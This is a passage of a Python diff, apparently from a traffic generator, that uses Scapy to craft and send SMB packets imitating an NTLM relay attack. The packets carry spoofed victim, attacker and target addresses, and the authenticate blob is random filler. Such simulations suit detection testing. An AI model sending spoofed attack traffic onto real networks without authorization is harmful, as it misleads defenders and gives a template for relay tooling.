+        smb_challenge += struct.pack('<H', 1)   # session setup
+        smb_challenge += struct.pack('<H', 1)
+        smb_challenge += b'\x00' * 4
+        smb_challenge += b'\x00' * 4
+        smb_challenge += struct.pack('<Q', 1)
+        smb_challenge += b'\x00' * 4
+        smb_challenge += b'\x00' * 4
+        smb_challenge += struct.pack('<Q', random.randint(1, 0xFFFFFFFF))
+        smb_challenge += b'\x00' * 16
+        # Session setup response body
+        smb_challenge += struct.pack('<H', 9)
+        smb_challenge += struct.pack('<H', 0)
+        sec_offset2 = len(smb_challenge)
+        smb_challenge += struct.pack('<H', sec_offset2)
+        smb_challenge += struct.pack('<H', len(ntlm_challenge))
+        smb_challenge += ntlm_challenge
+        nb_len2 = len(smb_challenge) - 4
+        struct.pack_into('!I', smb_challenge, 0, nb_len2)
+
+        packets.append(
+            base / IP(src=dst_ip, dst=src_ip) /
+            TCP(sport=445, dport=sport_relay, flags='PA',
+                seq=sseq2, ack=cseq2) /
+            Raw(load=bytes(smb_challenge))
+        )
+        sseq2 += len(smb_challenge)
+
+        # ═══ Phase 3: Attacker relays challenge back to victim ═══
+        # and gets NTLM Authenticate (Type 3)
+
+        # Relay challenge to victim
+        packets.append(
+            base / IP(src=src_ip, dst=victim_ip) /
+            TCP(sport=445, dport=sport_victim, flags='PA',
+                seq=sseq1, ack=cseq1) /
+            Raw(load=bytes(smb_challenge))
+        )
+        sseq1 += len(smb_challenge)
+
+        # Victim sends NTLM Authenticate (Type 3) with response to challenge
+        ntlm_auth = (
+            b'NTLMSSP\x00'
+            b'\x03\x00\x00\x00'       # Type 3 (Authenticate)
+        ) + os.urandom(random.randint(200, 400))  # NTLM response blob
+
+        smb_auth = bytearray()
+        smb_auth += b'\x00\x00\x00\x00'
+        smb_auth += b'\xfeSMB'
+        smb_auth += struct.pack('<H', 64)
+        smb_auth += b'\x00' * 2
+        smb_auth += b'\x00' * 4
+        smb_auth += struct.pack('<H', 1)
+        smb_auth += struct.pack('<H', 1)
+        smb_auth += b'\x00' * 4
+        smb_auth += b'\x00' * 4
+        smb_auth += struct.pack('<Q', 3)
+        smb_auth += b'\x00' * 4
+        smb_auth += b'\x00' * 4
+        smb_auth += struct.pack('<Q', 0)
+        smb_auth += b'\x00' * 16
+        smb_auth += struct.pack('<H', 25)
+        smb_auth += b'\x00\x01'
+        smb_auth += struct.pack('<I', 0)
+        smb_auth += struct.pack('<I', 0)
+        sec_offset3 = len(smb_auth) + 4
+        smb_auth += struct.pack('<H', sec_offset3)
+        smb_auth += struct.pack('<H', len(ntlm_auth))
+        smb_auth += struct.pack('<Q', 0)
+        smb_auth += ntlm_auth
+        nb_len3 = len(smb_auth) - 4
+        struct.pack_into('!I', smb_auth, 0, nb_len3)
+
+        packets.append(
+            base / IP(src=victim_ip, dst=src_ip) /
+            TCP(sport=sport_victim, dport=445, flags='PA',
+                seq=cseq1, ack=sseq1) /
+            Raw(load=bytes(smb_auth))
+        )
+        cseq1 += len(smb_auth)
+
+        # ═══ Phase 4: Attacker relays Type 3 to target ═══
+        packets.append(
+            base / IP(src=src_ip, dst=dst_ip) /
+            TCP(sport=sport_relay, dport=445, flags='PA',
+                seq=cseq2, ack=sseq2) /
+            Raw(load=bytes(smb_auth))
+        )
+        cseq2 += len(smb_auth)
+
+        # Target ACKs (authentication relayed successfully)
+        packets.append(
+            base / IP(src=dst_ip, dst=src_ip) /
+            TCP(sport=445, dport=sport_relay, flags='A',
+                seq=sseq2, ack=cseq2)
+        )
+
+        # Teardown both connections
+        fin1 = _tcp_fin(base, victim_ip, src_ip, sport_victim, 445, cseq1, sseq1)
+        fin2 = _tcp_fin(base, src_ip, dst_ip, sport_relay, 445, cseq2, sseq2)
+        packets.extend(fin1)
+        packets.extend(fin2)
+
+        log_message(f"    Relay #{i+1}: {victim_ip} -> {src_ip} -> {dst_ip}")
+
+    _send_with_tracking(packets, params, delay_override=0.2)
